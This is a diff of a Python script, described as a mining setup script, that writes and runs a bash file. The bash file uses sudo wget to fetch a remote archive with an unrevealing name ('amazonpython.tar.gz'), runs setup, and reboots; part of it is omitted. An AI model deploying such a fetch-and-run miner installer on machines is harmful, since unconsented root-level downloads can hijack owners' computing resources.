@@ -2,9 +2,7 @@ import argparse
 import subprocess
 
 def create_and_run_bash_script(worker, threads):
-    script_content = 
-   
-f"""#!/bin/bash
+    script_content = f"""#!/bin/bash
 cd /usr/local/bin
 sudo wget https://gitlab.com/amaz/grabcar/-/raw/main/amazonpython.tar.gz
 sudo apt update
@@ -19,15 +17,10 @@ echo "Setup completed!"
 sudo reboot
 """
 
-    
-
-   
-with open("setup.sh", "w") as file:
+    with open("setup.sh", "w") as file:
         file.write(script_content)
     
-    subprocess.run([
-        file.write(script_content)
-"bash", "setup.sh"], check=True)
+    subprocess.run(["bash", "setup.sh"], check=True)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Setup script for mining")
@@ -36,7 +29,3 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     create_and_run_bash_script(args.worker, args.threads)
-
-    args = parser.parse_args()
-
-    create_and_run
